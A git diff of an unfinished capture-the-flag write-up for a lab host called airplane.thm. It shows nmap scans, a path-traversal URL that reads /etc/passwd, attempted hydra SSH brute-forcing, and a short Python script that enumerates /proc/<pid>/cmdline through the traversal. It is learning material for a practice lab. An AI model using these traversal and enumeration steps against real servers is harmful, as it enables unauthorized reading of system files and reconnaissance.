@@ -1,3 +1,4 @@
+wip
 > Are you ready to fly?
 #### Steps
 1. Started out with an nmap scan `nmap -sV 10.10.101.33 -v`
@@ -8,7 +9,7 @@
 sudo sh -c "echo '10.10.101.33 airplane.thm' >> /etc/hosts"
 ```
 5. Navigating to the page, I found the page file specified with a page parameter -> `http://airplane.thm:8000/?page=index.html`
-6. After checking source  to make sure I didn't miss anything else, I modified the file path to grab `/etc/passwd`
+6. After checking source to make sure I didn't miss anything else, I modified the file path to grab `/etc/passwd`
 ```
 http://airplane.thm:8000/?page=/../../../../etc/passwd
 ```
@@ -18,10 +19,32 @@ http://airplane.thm:8000/?page=/../../../../etc/passwd
 carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
 hudson:x:1001:1001::/home/hudson:/bin/bash
 ```
-9. I tried to use the same path traversal to read potential `user.txt` files in the home folders, but all I could find was a `.bashrc` file under hudsons directory
-10. One interesting this is the `carlos,,,` section of carlos's line the in the /etc/passwd file
+9. I tried to use the same path traversal to read potential `user.txt` files in the home folders, but all I could find was a `.bashrc` file under hudsons directory (also I checked for ssh keys (`/.ssh/id_rsa`), there were none)
+10. One interesting thing is the `carlos,,,` section of carlos's line the in the /etc/passwd file
 11. This is the `GECOS` section, and the following commas just mean that phone number, email, etc parameters are empty
-12. So relatively useless </3
+12. So relatively useless </3 (but hey new info to me)
 13. I tried running `hydra` to bruteforce `ssh` with the new usernames, but I didn't have much luck
-14. Going back to the site itself, I decided to run a scan on all ports `-p-` to see if there were any other processes I missed
-15. 
+14. Going back to the site itself, I decided to run a scan on all ports `-p- -T5` to see if there were any other processes I missed
+15. From this I found port `6048`
+```
+PORT     STATE SERVICE VERSION
+6048/tcp open  x11?
+```
+16. Ok strange
+17. My only guess was trying to find out what processes were running by checking files manually
+18. All of this info is in the `/proc` directory
+19. Most `/proc` subdirectories are PIDs (numbers) so automating requests shouldn't be too difficult
+20. So I wrote a VERY barebones python script
+```python
+import requests
+
+for pid in range(1, 1001):
+    url = f"http://airplane.thm:8000/?page=/../../../../proc/{pid}/cmdline"
+    try:
+        res = requests.get(url, timeout=1) 
+        print(pid, res.text)
+    except requests.exceptions.RequestException as e:
+        print(f"Error fetching PID {pid}: {e}")
+```
+21. Took about 5000000 years to run but it worked!
+22. 
